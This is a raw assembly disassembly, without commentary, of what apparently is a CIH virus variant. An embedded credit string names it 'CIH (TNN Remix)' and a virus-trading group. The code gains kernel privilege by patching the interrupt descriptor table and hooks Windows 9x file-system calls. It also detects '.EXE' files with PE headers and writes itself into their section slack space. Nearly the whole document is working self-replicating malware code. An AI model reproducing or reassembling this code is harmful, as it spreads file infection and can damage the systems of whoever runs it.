                           .text:00401000 c3                               ret    
                           .text:00401001 00 00                            add    %al,(%eax)
                           .text:00401003 00 00                            add    %al,(%eax)
                           .text:00401005 00 00                            add    %al,(%eax)
                           .text:00401007 00 00                            add    %al,(%eax)
                           .text:00401009 00 00                            add    %al,(%eax)
                           .text:0040100b 00 00                            add    %al,(%eax)
                           .text:0040100d 04 00                            add    $0x0,%al
                           .text:0040100f 00 55 8d                         add    %dl,-0x73(%ebp)
                           .text:00401012 44                               inc    %esp
                           .text:00401013 24 f8                            and    $0xf8,%al
                           .text:00401015 2b db                            sub    %ebx,%ebx
                           .text:00401017 64 87 03                         xchg   %eax,%fs:(%ebx)
                           .text:0040101a e8 00 00 00 00                   call   0x0040101f
                           .text:0040101f 5b                               pop    %ebx
                           .text:00401020 8d 4b 42                         lea    0x42(%ebx),%ecx
                           .text:00401023 51                               push   %ecx
                           .text:00401024 50                               push   %eax
                           .text:00401025 50                               push   %eax
                           .text:00401026 0f 01 4c 24 fe                   sidtl  -0x2(%esp)
                           .text:0040102b 5b                               pop    %ebx
                           .text:0040102c 83 c3 1c                         add    $0x1c,%ebx
                           .text:0040102f fa                               cli    
                           .text:00401030 8b 2b                            mov    (%ebx),%ebp
                           .text:00401032 66 8b 6b fc                      mov    -0x4(%ebx),%bp
                           .text:00401036 8d 71 12                         lea    0x12(%ecx),%esi
                           .text:00401039 56                               push   %esi
                           .text:0040103a 66 89 73 fc                      mov    %si,-0x4(%ebx)
                           .text:0040103e c1 ee 10                         shr    $0x10,%esi
                           .text:00401041 66 89 73 02                      mov    %si,0x2(%ebx)
                           .text:00401045 5e                               pop    %esi
                           .text:00401046 cc                               int3   
                           .text:00401047 56                               push   %esi
                           .text:00401048 8b f0                            mov    %eax,%esi
                           .text:0040104a 8b 48 fc                         mov    -0x4(%eax),%ecx
                           .text:0040104d f3 a4                            rep movsb %ds:(%esi),%es:(%edi)
                           .text:0040104f 83 e8 08                         sub    $0x8,%eax
                           .text:00401052 8b 30                            mov    (%eax),%esi
                           .text:00401054 0b f6                            or     %esi,%esi
                           .text:00401056 74 02                            je     0x0040105a
                           .text:00401058 eb f0                            jmp    0x0040104a
                           .text:0040105a 5e                               pop    %esi
                           .text:0040105b cc                               int3   
                           .text:0040105c fb                               sti    
                           .text:0040105d 2b db                            sub    %ebx,%ebx
                           .text:0040105f eb 07                            jmp    0x00401068
                           .text:00401061 2b db                            sub    %ebx,%ebx
                           .text:00401063 64 8b 03                         mov    %fs:(%ebx),%eax
                           .text:00401066 8b 20                            mov    (%eax),%esp
                           .text:00401068 64 8f 03                         popl   %fs:(%ebx)
                           .text:0040106b 58                               pop    %eax
                           .text:0040106c 5d                               pop    %ebp
                           .text:0040106d 68 00 10 40 00                   push   $0x401000
                           .text:00401072 c3                               ret    
                           .text:00401073 74 32                            je     0x004010a7
                           .text:00401075 0f 21 c1                         mov    %db0,%ecx
                           .text:00401078 e3 10                            jecxz  0x0040108a
                           .text:0040107a 83 04 24 15                      addl   $0x15,(%esp)
                           .text:0040107e 66 89 6b fc                      mov    %bp,-0x4(%ebx)
                           .text:00401082 c1 ed 10                         shr    $0x10,%ebp
                           .text:00401085 66 89 6b 02                      mov    %bp,0x2(%ebx)
                           .text:00401089 cf                               iret   
                           .text:0040108a 0f 23 c3                         mov    %ebx,%db0
                           .text:0040108d 6a 0f                            push   $0xf
                           .text:0040108f 51                               push   %ecx
                           .text:00401090 6a ff                            push   $0xffffffff
                           .text:00401092 51                               push   %ecx
                           .text:00401093 51                               push   %ecx
                           .text:00401094 51                               push   %ecx
                           .text:00401095 6a 01                            push   $0x1
                           .text:00401097 6a 02                            push   $0x2
                           .text:00401099 cd 20                            int    $0x20
                           .text:0040109b 53                               push   %ebx
                           .text:0040109c 00 01                            add    %al,(%ecx)
                           .text:0040109e 00 83 c4 20 97 8d                add    %al,-0x7268df3c(%ebx)
                           .text:004010a4 46                               inc    %esi
                           .text:004010a5 9d                               popf   
                           .text:004010a6 cf                               iret   
                           .text:004010a7 8d 87 e2 fc ff ff                lea    -0x31e(%edi),%eax
                           .text:004010ad 50                               push   %eax
                           .text:004010ae cd 20                            int    $0x20
                           .text:004010b0 67 00 40 00                      add    %al,0x0(%bx,%si)
                           .text:004010b4 0f 23 c0                         mov    %eax,%db0
                           .text:004010b7 58                               pop    %eax
                           .text:004010b8 8b 4e 3d                         mov    0x3d(%esi),%ecx
                           .text:004010bb 8b 11                            mov    (%ecx),%edx
                           .text:004010bd 89 50 fc                         mov    %edx,-0x4(%eax)
                           .text:004010c0 8d 40 d6                         lea    -0x2a(%eax),%eax
                           .text:004010c3 89 01                            mov    %eax,(%ecx)
                           .text:004010c5 fa                               cli    
                           .text:004010c6 eb b6                            jmp    0x0040107e
                           .text:004010c8 53                               push   %ebx
                           .text:004010c9 e8 00 00 00 00                   call   0x004010ce
                           .text:004010ce 5b                               pop    %ebx
                           .text:004010cf 83 c3 24                         add    $0x24,%ebx
                           .text:004010d2 53                               push   %ebx
                           .text:004010d3 cd 20                            int    $0x20
                           .text:004010d5 68 00 40 00 58                   push   $0x58004000
                           .text:004010da ff 74 24 08                      pushl  0x8(%esp)
                           .text:004010de ff 53 fc                         call   *-0x4(%ebx)
                           .text:004010e1 59                               pop    %ecx
                           .text:004010e2 50                               push   %eax
                           .text:004010e3 53                               push   %ebx
                           .text:004010e4 ff 53 fc                         call   *-0x4(%ebx)
                           .text:004010e7 59                               pop    %ecx
                           .text:004010e8 0f 23 c0                         mov    %eax,%db0
                           .text:004010eb 58                               pop    %eax
                           .text:004010ec 5b                               pop    %ebx
                           .text:004010ed c3                               ret    
                           .text:004010ee 00 00                            add    %al,(%eax)
                           .text:004010f0 00 00                            add    %al,(%eax)
                           .text:004010f2 60                               pusha  
                           .text:004010f3 e8 00 00 00 00                   call   0x004010f8
                           .text:004010f8 5e                               pop    %esi
                           .text:004010f9 81 c6 18 03 00 00                add    $0x318,%esi
                           .text:004010ff f6 06 01                         testb  $0x1,(%esi)
                           .text:00401102 0f 85 06 02 00 00                jne    0x0040130e
                           .text:00401108 8d 5c 24 28                      lea    0x28(%esp),%ebx
                           .text:0040110c 83 3b 24                         cmpl   $0x24,(%ebx)
                           .text:0040110f 0f 85 f3 01 00 00                jne    0x00401308
                           .text:00401115 fe 06                            incb   (%esi)
                           .text:00401117 83 c6 05                         add    $0x5,%esi
                           .text:0040111a 56                               push   %esi
                           .text:0040111b 8a 43 04                         mov    0x4(%ebx),%al
                           .text:0040111e 3c ff                            cmp    $0xff,%al
                           .text:00401120 74 08                            je     0x0040112a
                           .text:00401122 04 40                            add    $0x40,%al
                           .text:00401124 b4 3a                            mov    $0x3a,%ah
                           .text:00401126 89 06                            mov    %eax,(%esi)
                           .text:00401128 46                               inc    %esi
                           .text:00401129 46                               inc    %esi
                           .text:0040112a 6a 00                            push   $0x0
                           .text:0040112c 6a 7f                            push   $0x7f
                           .text:0040112e 8b 5b 10                         mov    0x10(%ebx),%ebx
                           .text:00401131 8b 43 0c                         mov    0xc(%ebx),%eax
                           .text:00401134 83 c0 04                         add    $0x4,%eax
                           .text:00401137 50                               push   %eax
                           .text:00401138 56                               push   %esi
                           .text:00401139 cd 20                            int    $0x20
                           .text:0040113b 41                               inc    %ecx
                           .text:0040113c 00 40 00                         add    %al,0x0(%eax)
                           .text:0040113f 83 c4 10                         add    $0x10,%esp
                           .text:00401142 81 7c 06 fc 2e 45 58 45          cmpl   $0x4558452e,-0x4(%esi,%eax,1)
                           .text:0040114a 5e                               pop    %esi
                           .text:0040114b 0f 85 b4 01 00 00                jne    0x00401305
                           .text:00401151 66 83 7b 18 01                   cmpw   $0x1,0x18(%ebx)
                           .text:00401156 0f 85 a9 01 00 00                jne    0x00401305
                           .text:0040115c 66 b8 00 43                      mov    $0x4300,%ax
                           .text:00401160 cd 20                            int    $0x20
                           .text:00401162 32 00                            xor    (%eax),%al
                           .text:00401164 40                               inc    %eax
                           .text:00401165 00 0f                            add    %cl,(%edi)
                           .text:00401167 82                               (bad)  
                           .text:00401168 99                               cltd   
                           .text:00401169 01 00                            add    %eax,(%eax)
                           .text:0040116b 00 51 8b                         add    %dl,-0x75(%ecx)
                           .text:0040116e be 4d fd ff ff                   mov    $0xfffffd4d,%esi
                           .text:00401173 8b 3f                            mov    (%edi),%edi
                           .text:00401175 f6 c1 01                         test   $0x1,%cl
                           .text:00401178 74 08                            je     0x00401182
                           .text:0040117a 66 b8 01 43                      mov    $0x4301,%ax
                           .text:0040117e 2b c9                            sub    %ecx,%ecx
                           .text:00401180 ff d7                            call   *%edi
                           .text:00401182 2b c0                            sub    %eax,%eax
                           .text:00401184 b4 d5                            mov    $0xd5,%ah
                           .text:00401186 2b c9                            sub    %ecx,%ecx
                           .text:00401188 2b d2                            sub    %edx,%edx
                           .text:0040118a 42                               inc    %edx
                           .text:0040118b 8b da                            mov    %edx,%ebx
                           .text:0040118d 43                               inc    %ebx
                           .text:0040118e ff d7                            call   *%edi
                           .text:00401190 93                               xchg   %eax,%ebx
                           .text:00401191 59                               pop    %ecx
                           .text:00401192 9c                               pushf  
                           .text:00401193 f6 c1 01                         test   $0x1,%cl
                           .text:00401196 74 06                            je     0x0040119e
                           .text:00401198 66 b8 01 43                      mov    $0x4301,%ax
                           .text:0040119c ff d7                            call   *%edi
                           .text:0040119e 9d                               popf   
                           .text:0040119f 0f 82 60 01 00 00                jb     0x00401305
                           .text:004011a5 56                               push   %esi
                           .text:004011a6 9c                               pushf  
                           .text:004011a7 83 c6 7f                         add    $0x7f,%esi
                           .text:004011aa 2b c0                            sub    %eax,%eax
                           .text:004011ac b4 d6                            mov    $0xd6,%ah
                           .text:004011ae 8b e8                            mov    %eax,%ebp
                           .text:004011b0 6a 04                            push   $0x4
                           .text:004011b2 59                               pop    %ecx
                           .text:004011b3 6a 3c                            push   $0x3c
                           .text:004011b5 5a                               pop    %edx
                           .text:004011b6 ff d7                            call   *%edi
                           .text:004011b8 8b 16                            mov    (%esi),%edx
                           .text:004011ba 4a                               dec    %edx
                           .text:004011bb 8b c5                            mov    %ebp,%eax
                           .text:004011bd ff d7                            call   *%edi
                           .text:004011bf 81 3e 00 50 45 00                cmpl   $0x455000,(%esi)
                           .text:004011c5 0f 85 24 01 00 00                jne    0x004012ef
                           .text:004011cb 53                               push   %ebx
                           .text:004011cc 6a 00                            push   $0x0
                           .text:004011ce 6a 01                            push   $0x1
                           .text:004011d0 52                               push   %edx
                           .text:004011d1 57                               push   %edi
                           .text:004011d2 0f 23 cc                         mov    %esp,%db1
                           .text:004011d5 50                               push   %eax
                           .text:004011d6 8b c5                            mov    %ebp,%eax
                           .text:004011d8 b1 52                            mov    $0x52,%cl
                           .text:004011da 83 c2 07                         add    $0x7,%edx
                           .text:004011dd ff d7                            call   *%edi
                           .text:004011df 8d 42 22                         lea    0x22(%edx),%eax
                           .text:004011e2 50                               push   %eax
                           .text:004011e3 8d 06                            lea    (%esi),%eax
                           .text:004011e5 50                               push   %eax
                           .text:004011e6 0f b7 46 0e                      movzwl 0xe(%esi),%eax
                           .text:004011ea 8d 54 10 12                      lea    0x12(%eax,%edx,1),%edx
                           .text:004011ee b0 28                            mov    $0x28,%al
                           .text:004011f0 8a 0e                            mov    (%esi),%cl
                           .text:004011f2 f6 e1                            mul    %cl
                           .text:004011f4 8d 76 32                         lea    0x32(%esi),%esi
                           .text:004011f7 50                               push   %eax
                           .text:004011f8 52                               push   %edx
                           .text:004011f9 56                               push   %esi
                           .text:004011fa 41                               inc    %ecx
                           .text:004011fb 51                               push   %ecx
                           .text:004011fc c1 e1 03                         shl    $0x3,%ecx
                           .text:004011ff 51                               push   %ecx
                           .text:00401200 03 c8                            add    %eax,%ecx
                           .text:00401202 03 ca                            add    %edx,%ecx
                           .text:00401204 2b 4e 1c                         sub    0x1c(%esi),%ecx
                           .text:00401207 f7 d1                            not    %ecx
                           .text:00401209 41                               inc    %ecx
                           .text:0040120a 51                               push   %ecx
                           .text:0040120b 91                               xchg   %eax,%ecx
                           .text:0040120c 8b 46 f0                         mov    -0x10(%esi),%eax
                           .text:0040120f 03 46 fc                         add    -0x4(%esi),%eax
                           .text:00401212 89 86 a8 fb ff ff                mov    %eax,-0x458(%esi)
                           .text:00401218 66 81 3c 24 b8 00                cmpw   $0xb8,(%esp)
                           .text:0040121e 7c 7b                            jl     0x0040129b
                           .text:00401220 8b c5                            mov    %ebp,%eax
                           .text:00401222 ff d7                            call   *%edi
                           .text:00401224 95                               xchg   %eax,%ebp
                           .text:00401225 6a 04                            push   $0x4
                           .text:00401227 59                               pop    %ecx
                           .text:00401228 52                               push   %edx
                           .text:00401229 8b 56 3c                         mov    0x3c(%esi),%edx
                           .text:0040122c 83 c2 12                         add    $0x12,%edx
                           .text:0040122f ff d7                            call   *%edi
                           .text:00401231 81 3e 6e 5a 69 70                cmpl   $0x70695a6e,(%esi)
                           .text:00401237 74 67                            je     0x004012a0
                           .text:00401239 5a                               pop    %edx
                           .text:0040123a 5b                               pop    %ebx
                           .text:0040123b 5f                               pop    %edi
                           .text:0040123c 59                               pop    %ecx
                           .text:0040123d 57                               push   %edi
                           .text:0040123e 03 d5                            add    %ebp,%edx
                           .text:00401240 52                               push   %edx
                           .text:00401241 03 ee                            add    %esi,%ebp
                           .text:00401243 55                               push   %ebp
                           .text:00401244 8d 44 3d fc                      lea    -0x4(%ebp,%edi,1),%eax
                           .text:00401248 89 18                            mov    %ebx,(%eax)
                           .text:0040124a 53                               push   %ebx
                           .text:0040124b 03 d7                            add    %edi,%edx
                           .text:0040124d 52                               push   %edx
                           .text:0040124e 8d be 4a fb ff ff                lea    -0x4b6(%esi),%edi
                           .text:00401254 57                               push   %edi
                           .text:00401255 89 56 ce                         mov    %edx,-0x32(%esi)
                           .text:00401258 8d 56 d8                         lea    -0x28(%esi),%edx
                           .text:0040125b bd 00 04 00 00                   mov    $0x400,%ebp
                           .text:00401260 eb 31                            jmp    0x00401293
                           .text:00401262 83 c2 28                         add    $0x28,%edx
                           .text:00401265 8b 5a 10                         mov    0x10(%edx),%ebx
                           .text:00401268 2b 5a 08                         sub    0x8(%edx),%ebx
                           .text:0040126b 76 2c                            jbe    0x00401299
                           .text:0040126d 53                               push   %ebx
                           .text:0040126e 83 e8 08                         sub    $0x8,%eax
                           .text:00401271 89 18                            mov    %ebx,(%eax)
                           .text:00401273 8b 5a 14                         mov    0x14(%edx),%ebx
                           .text:00401276 03 5a 08                         add    0x8(%edx),%ebx
                           .text:00401279 53                               push   %ebx
                           .text:0040127a 57                               push   %edi
                           .text:0040127b 8b 5a 08                         mov    0x8(%edx),%ebx
                           .text:0040127e 03 5a 0c                         add    0xc(%edx),%ebx
                           .text:00401281 03 5e fc                         add    -0x4(%esi),%ebx
                           .text:00401284 89 58 04                         mov    %ebx,0x4(%eax)
                           .text:00401287 8b 18                            mov    (%eax),%ebx
                           .text:00401289 01 5a 08                         add    %ebx,0x8(%edx)
                           .text:0040128c 81 4a 24 40 00 00 40             orl    $0x40000040,0x24(%edx)
                           .text:00401293 2b eb                            sub    %ebx,%ebp
                           .text:00401295 76 0e                            jbe    0x004012a5
                           .text:00401297 03 fb                            add    %ebx,%edi
                           .text:00401299 e2 c7                            loop   0x00401262
                           .text:0040129b 0f 21 cc                         mov    %db1,%esp
                           .text:0040129e eb 33                            jmp    0x004012d3
                           .text:004012a0 83 c4 3c                         add    $0x3c,%esp
                           .text:004012a3 eb 4a                            jmp    0x004012ef
                           .text:004012a5 01 28                            add    %ebp,(%eax)
                           .text:004012a7 01 6c 24 08                      add    %ebp,0x8(%esp)
                           .text:004012ab 2b db                            sub    %ebx,%ebx
                           .text:004012ad 89 58 fc                         mov    %ebx,-0x4(%eax)
                           .text:004012b0 8d 86 9a fc ff ff                lea    -0x366(%esi),%eax
                           .text:004012b6 b1 04                            mov    $0x4,%cl
                           .text:004012b8 66 c7 00 cd 20                   movw   $0x20cd,(%eax)
                           .text:004012bd 8b 94 8e 62 fe ff ff             mov    -0x19e(%esi,%ecx,4),%edx
                           .text:004012c4 89 50 02                         mov    %edx,0x2(%eax)
                           .text:004012c7 0f b6 94 31 61 fe ff ff          movzbl -0x19f(%ecx,%esi,1),%edx
                           .text:004012cf 2b c2                            sub    %edx,%eax
                           .text:004012d1 e2 e5                            loop   0x004012b8
                           .text:004012d3 0f 21 c8                         mov    %db1,%eax
                           .text:004012d6 8b 58 10                         mov    0x10(%eax),%ebx
                           .text:004012d9 8b 38                            mov    (%eax),%edi
                           .text:004012db 59                               pop    %ecx
                           .text:004012dc e3 0d                            jecxz  0x004012eb
                           .text:004012de 8b f1                            mov    %ecx,%esi
                           .text:004012e0 b8 01 d6 00 00                   mov    $0xd601,%eax
                           .text:004012e5 5a                               pop    %edx
                           .text:004012e6 59                               pop    %ecx
                           .text:004012e7 ff d7                            call   *%edi
                           .text:004012e9 eb f0                            jmp    0x004012db
                           .text:004012eb 5b                               pop    %ebx
                           .text:004012ec 58                               pop    %eax
                           .text:004012ed f9                               stc    
                           .text:004012ee 9c                               pushf  
                           .text:004012ef 2b c0                            sub    %eax,%eax
                           .text:004012f1 b4 d7                            mov    $0xd7,%ah
                           .text:004012f3 ff d7                            call   *%edi
                           .text:004012f5 9d                               popf   
                           .text:004012f6 5e                               pop    %esi
                           .text:004012f7 8b df                            mov    %edi,%ebx
                           .text:004012f9 66 b8 03 43                      mov    $0x4303,%ax
                           .text:004012fd 8b 4e fc                         mov    -0x4(%esi),%ecx
                           .text:00401300 8b 7e fe                         mov    -0x2(%esi),%edi
                           .text:00401303 ff d3                            call   *%ebx
                           .text:00401305 fe 4e fb                         decb   -0x5(%esi)
                           .text:00401308 61                               popa   
                           .text:00401309 0f 21 c0                         mov    %db0,%eax
                           .text:0040130c ff 20                            jmp    *(%eax)
                           .text:0040130e 8b dc                            mov    %esp,%ebx
                           .text:00401310 ff 73 38                         pushl  0x38(%ebx)
                           .text:00401313 ff 53 24                         call   *0x24(%ebx)
                           .text:00401316 59                               pop    %ecx
                           .text:00401317 89 43 1c                         mov    %eax,0x1c(%ebx)
                           .text:0040131a 83 7b 28 24                      cmpl   $0x24,0x28(%ebx)
                           .text:0040131e 75 06                            jne    0x00401326
                           .text:00401320 8b 41 28                         mov    0x28(%ecx),%eax
                           .text:00401323 89 46 01                         mov    %eax,0x1(%esi)
                           .text:00401326 61                               popa   
                           .text:00401327 c3                               ret    
                           .text:00401328 00 3a                            add    %bh,(%edx)
                           .text:0040132a 66 27                            data16 daa 
                           .text:0040132c 53                               push   %ebx
                           .text:0040132d 00 01                            add    %al,(%ecx)
                           .text:0040132f 00 68 00                         add    %ch,0x0(%eax)
                           .text:00401332 40                               inc    %eax
                           .text:00401333 00 41 00                         add    %al,0x0(%ecx)
                           .text:00401336 40                               inc    %eax
                           .text:00401337 00 32                            add    %dh,(%edx)
                           .text:00401339 00 40 00                         add    %al,0x0(%eax)
                           .text:0040133c 43                               inc    %ebx
                           .text:0040133d 49                               dec    %ecx
                           .text:0040133e 48                               dec    %eax
                           .text:0040133f 20 28                            and    %ch,(%eax)
                           .text:00401341 54                               push   %esp
                           .text:00401342 4e                               dec    %esi
                           .text:00401343 4e                               dec    %esi
                           .text:00401344 20 52 65                         and    %dl,0x65(%edx)
                           .text:00401347 6d                               insl   (%dx),%es:(%edi)
                           .text:00401348 69 78 29 20 77 72 69             imul   $0x69727720,0x29(%eax),%edi
                           .text:0040134f 74 74                            je     0x004013c5
                           .text:00401351 65 6e                            outsb  %gs:(%esi),(%dx)
                           .text:00401353 20 62 79                         and    %ah,0x79(%edx)
                           .text:00401356 20 20                            and    %ah,(%eax)
                           .text:00401358 54                               push   %esp
                           .text:00401359 54                               push   %esp
                           .text:0040135a 49                               dec    %ecx
                           .text:0040135b 54                               push   %esp
                           .text:0040135c 20 6f 66                         and    %ch,0x66(%edi)
                           .text:0040135f 20 54 41 54                      and    %dl,0x54(%ecx,%eax,2)
                           .text:00401363 55                               push   %ebp
                           .text:00401364 4e                               dec    %esi
                           .text:00401365 47                               inc    %edi
                           .text:00401366 20 20                            and    %ah,(%eax)
                           .text:00401368 2d 2d 5b bd 5d                   sub    $0x5dbd5b2d,%eax
                           .text:0040136d 2d 2d 20 20 72                   sub    $0x7220202d,%eax
                           .text:00401372 65 6d                            gs insl (%dx),%es:(%edi)
                           .text:00401374 69 78 65 64 20 62 79             imul   $0x79622064,0x65(%eax),%edi
                           .text:0040137b 20 56 69                         and    %dl,0x69(%esi)
                           .text:0040137e 63 6f 64                         arpl   %bp,0x64(%edi)
                           .text:00401381 69 6e 45 53 20 20 2d             imul   $0x2d202053,0x45(%esi),%ebp
                           .text:00401388 2d 5b bd 5d 2d                   sub    $0x2d5dbd5b,%eax
                           .text:0040138d 2d 20 20 54 68                   sub    $0x68542020,%eax
                           .text:00401392 65 20 4e 61                      and    %cl,%gs:0x61(%esi)
                           .text:00401396 72 6b                            jb     0x00401403
                           .text:00401398 6f                               outsl  %ds:(%esi),(%dx)
                           .text:00401399 74 69                            je     0x00401404
                           .text:0040139b 63 20                            arpl   %sp,(%eax)
                           .text:0040139d 4e                               dec    %esi
                           .text:0040139e 65 74 77                         gs je  0x00401418
                           .text:004013a1 6f                               outsl  %ds:(%esi),(%dx)
                           .text:004013a2 72 6b                            jb     0x0040140f
                           .text:004013a4 20 56 69                         and    %dl,0x69(%esi)
                           .text:004013a7 72 75                            jb     0x0040141e
                           .text:004013a9 73 20                            jae    0x004013cb
                           .text:004013ab 57                               push   %edi
                           .text:004013ac 61                               popa   
                           .text:004013ad 72 65                            jb     0x00401414
                           .text:004013af 68 6f 75 73 65                   push   $0x6573756f
                           .text:004013b4 20 20                            and    %ah,(%eax)
                           .text:004013b6 68 74 74 70 3a                   push   $0x3a707474
                           .text:004013bb 2f                               das    
                           .text:004013bc 2f                               das    
                           .text:004013bd 75 73                            jne    0x00401432
                           .text:004013bf 65 72 73                         gs jb  0x00401435
                           .text:004013c2 2e 73 6b                         jae,pn 0x00401430
                           .text:004013c5 79 6e                            jns    0x00401435
                           .text:004013c7 65 74 2e                         gs je  0x004013f8
                           .text:004013ca 62 65 2f                         bound  %esp,0x2f(%ebp)
                           .text:004013cd 73 6f                            jae    0x0040143e
                           .text:004013cf 6d                               insl   (%dx),%es:(%edi)
                           .text:004013d0 6e                               outsb  %ds:(%esi),(%dx)
                           .text:004013d1 75 73                            jne    0x00401446
                           .text:004013d3 2f                               das    
                           .text:004013d4 76 69                            jbe    0x0040143f
                           .text:004013d6 72 6e                            jb     0x00401446
                           .text:004013d8 6e                               outsb  %ds:(%esi),(%dx)
                           .text:004013d9 76 77                            jbe    0x00401452
                           .text:004013db 2e 68 74 6d 6c 20                cs push $0x206c6d74
                           .text:004013e1 20 2d 2d 5b bd 5d                and    %ch,0x5dbd5b2d
                           .text:004013e7 2d 2d 20 20 a9                   sub    $0xa920202d,%eax
                           .text:004013ec 56                               push   %esi
                           .text:004013ed 69 63 92 73 20 4e 6f             imul   $0x6f4e2073,-0x6e(%ebx),%esp
                           .text:004013f4 74 20                            je     0x00401416
                           .text:004013f6 57                               push   %edi
                           .text:004013f7 6f                               outsl  %ds:(%esi),(%dx)
                           .text:004013f8 72 6b                            jb     0x00401465
                           .text:004013fa 69 6e 92 20 57 69 74             imul   $0x74695720,-0x6e(%esi),%ebp
                           .text:00401401 68 20 41 20 46                   push   $0x46204120
                           .text:00401406 75 6c                            jne    0x00401474
                           .text:00401408 6c                               insb   (%dx),%es:(%edi)
                           .text:00401409 20 44 65 63                      and    %al,0x63(%ebp,%eiz,2)
                           .text:0040140d 6b 21 20                         imul   $0x20,(%ecx),%esp
                           .text:00401410 00 00                            add    %al,(%eax)
                           .text:00401412 00 00                            add    %al,(%eax)
                           .text:00401414 00 00                            add    %al,(%eax)
                           .text:00401416 00 00                            add    %al,(%eax)
                           .text:00401418 00 00                            add    %al,(%eax)
                           .text:0040141a 00 00                            add    %al,(%eax)
                           .text:0040141c 00 00                            add    %al,(%eax)
                           .text:0040141e 00 00                            add    %al,(%eax)
                           .text:00401420 00 00                            add    %al,(%eax)
                           .text:00401422 00 00                            add    %al,(%eax)
                           .text:00401424 00 00                            add    %al,(%eax)
                           .text:00401426 00 00                            add    %al,(%eax)
                           .text:00401428 00 00                            add    %al,(%eax)
                           .text:0040142a 00 00                            add    %al,(%eax)
                           .text:0040142c 00 00                            add    %al,(%eax)
                           .text:0040142e 00 00                            add    %al,(%eax)
                           .text:00401430 00 00                            add    %al,(%eax)
                           .text:00401432 00 00                            add    %al,(%eax)
                           .text:00401434 00 00                            add    %al,(%eax)
                           .text:00401436 00 00                            add    %al,(%eax)
                           .text:00401438 00 00                            add    %al,(%eax)
                           .text:0040143a 00 00                            add    %al,(%eax)
                           .text:0040143c 00 00                            add    %al,(%eax)
                           .text:0040143e 00 00                            add    %al,(%eax)
                           .text:00401440 00 00                            add    %al,(%eax)
                           .text:00401442 00 00                            add    %al,(%eax)
                           .text:00401444 00 00                            add    %al,(%eax)
                           .text:00401446 00 00                            add    %al,(%eax)
                           .text:00401448 00 00                            add    %al,(%eax)
                           .text:0040144a 00 00                            add    %al,(%eax)
                           .text:0040144c 00 00                            add    %al,(%eax)
                           .text:0040144e 00 00                            add    %al,(%eax)
                           .text:00401450 00 00                            add    %al,(%eax)
                           .text:00401452 00 00                            add    %al,(%eax)
                           .text:00401454 00 00                            add    %al,(%eax)
                           .text:00401456 00 00                            add    %al,(%eax)
                           .text:00401458 00 00                            add    %al,(%eax)
                           .text:0040145a 00 00                            add    %al,(%eax)
                           .text:0040145c 00 00                            add    %al,(%eax)
                           .text:0040145e 00 00                            add    %al,(%eax)
                           .text:00401460 00 00                            add    %al,(%eax)
                           .text:00401462 00 00                            add    %al,(%eax)
                           .text:00401464 00 00                            add    %al,(%eax)
                           .text:00401466 00 00                            add    %al,(%eax)
                           .text:00401468 00 00                            add    %al,(%eax)
                           .text:0040146a 00 00                            add    %al,(%eax)
                           .text:0040146c 00 00                            add    %al,(%eax)
                           .text:0040146e 00 00                            add    %al,(%eax)
                           .text:00401470 00 00                            add    %al,(%eax)
                           .text:00401472 00 00                            add    %al,(%eax)
                           .text:00401474 00 00                            add    %al,(%eax)
                           .text:00401476 00 00                            add    %al,(%eax)
                           .text:00401478 00 00                            add    %al,(%eax)
                           .text:0040147a 00 00                            add    %al,(%eax)
                           .text:0040147c 00 00                            add    %al,(%eax)
                           .text:0040147e 00 00                            add    %al,(%eax)
                           .text:00401480 00 00                            add    %al,(%eax)
                           .text:00401482 00 00                            add    %al,(%eax)
                           .text:00401484 00 00                            add    %al,(%eax)
                           .text:00401486 00 00                            add    %al,(%eax)
                           .text:00401488 00 00                            add    %al,(%eax)
                           .text:0040148a 00 00                            add    %al,(%eax)
                           .text:0040148c 00 00                            add    %al,(%eax)
                           .text:0040148e 00 00                            add    %al,(%eax)
                           .text:00401490 00 00                            add    %al,(%eax)
                           .text:00401492 00 00                            add    %al,(%eax)
                           .text:00401494 00 00                            add    %al,(%eax)
                           .text:00401496 00 00                            add    %al,(%eax)
                           .text:00401498 00 00                            add    %al,(%eax)
                           .text:0040149a 00 00                            add    %al,(%eax)
                           .text:0040149c 00 00                            add    %al,(%eax)
                           .text:0040149e 00 00                            add    %al,(%eax)
                           .text:004014a0 00 00                            add    %al,(%eax)
                           .text:004014a2 00 00                            add    %al,(%eax)
                           .text:004014a4 00 00                            add    %al,(%eax)
                           .text:004014a6 00 00                            add    %al,(%eax)
                           .text:004014a8 00 00                            add    %al,(%eax)
                           .text:004014aa 00 00                            add    %al,(%eax)
                           .text:004014ac 00 00                            add    %al,(%eax)
                           .text:004014ae 00 00                            add    %al,(%eax)
                           .text:004014b0 00 00                            add    %al,(%eax)
                           .text:004014b2 00 00                            add    %al,(%eax)
                           .text:004014b4 00 00                            add    %al,(%eax)
                           .text:004014b6 00 00                            add    %al,(%eax)
                           .text:004014b8 00 00                            add    %al,(%eax)
                           .text:004014ba 00 00                            add    %al,(%eax)
                           .text:004014bc 00 00                            add    %al,(%eax)
                           .text:004014be 00 00                            add    %al,(%eax)
                           .text:004014c0 00 00                            add    %al,(%eax)
                           .text:004014c2 00 00                            add    %al,(%eax)
                           .text:004014c4 00 00                            add    %al,(%eax)
                           .text:004014c6 00 00                            add    %al,(%eax)
                           .text:004014c8 00 00                            add    %al,(%eax)
                           .text:004014ca 00 00                            add    %al,(%eax)
                           .text:004014cc 00 00                            add    %al,(%eax)
                           .text:004014ce 00 00                            add    %al,(%eax)
                           .text:004014d0 00 00                            add    %al,(%eax)
                           .text:004014d2 00 00                            add    %al,(%eax)
                           .text:004014d4 00 00                            add    %al,(%eax)
                           .text:004014d6 00 00                            add    %al,(%eax)
                           .text:004014d8 00 00                            add    %al,(%eax)
                           .text:004014da 00 00                            add    %al,(%eax)
                           .text:004014dc 00 00                            add    %al,(%eax)
                           .text:004014de 00 00                            add    %al,(%eax)
                           .text:004014e0 00 00                            add    %al,(%eax)
                           .text:004014e2 00 00                            add    %al,(%eax)
                           .text:004014e4 00 00                            add    %al,(%eax)
                           .text:004014e6 00 00                            add    %al,(%eax)
                           .text:004014e8 00 00                            add    %al,(%eax)
                           .text:004014ea 00 00                            add    %al,(%eax)
                           .text:004014ec 00 00                            add    %al,(%eax)
                           .text:004014ee 00 00                            add    %al,(%eax)
                           .text:004014f0 00 00                            add    %al,(%eax)
                           .text:004014f2 00 00                            add    %al,(%eax)
                           .text:004014f4 00 00                            add    %al,(%eax)
                           .text:004014f6 00 00                            add    %al,(%eax)
                           .text:004014f8 00 00                            add    %al,(%eax)
                           .text:004014fa 00 00                            add    %al,(%eax)
                           .text:004014fc 00 00                            add    %al,(%eax)
                           .text:004014fe 00 00                            add    %al,(%eax)
